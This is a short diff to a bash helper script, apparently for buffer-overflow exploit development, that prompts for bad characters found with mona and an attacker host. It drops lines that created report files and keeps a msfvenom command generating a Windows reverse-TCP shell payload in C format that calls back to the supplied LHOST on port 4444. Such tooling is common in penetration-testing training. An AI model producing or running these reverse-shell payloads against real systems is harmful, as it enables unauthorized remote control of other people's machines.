@@ -4,9 +4,6 @@ echo "Note: Provide empty inputs to generate a full characterset payload."
 read -a badchars -p 'Specify outlying bad characters (from mona): ' 
 read -a lhost -p 'Specify lhost (for venom): '
 
-echo "[+] Generating txt files for reporting {1_fuzzing_result.txt, 2_pattern_offset_result.txt, 3_bad_characters_result.txt, 4_jmp_address_results.txt}"
-touch 1_fuzzing_result.txt 2_pattern_offset_result.txt 3_bad_characters_result.txt 4_jmp_address_results.txt
-
 if [ -z "$badchars" ]
 then
 echo "[+] Full bad characterset payload: "
@@ -35,5 +32,4 @@ then
 
     echo -n "[+] msfvenom output: "
     echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"
-
 fi
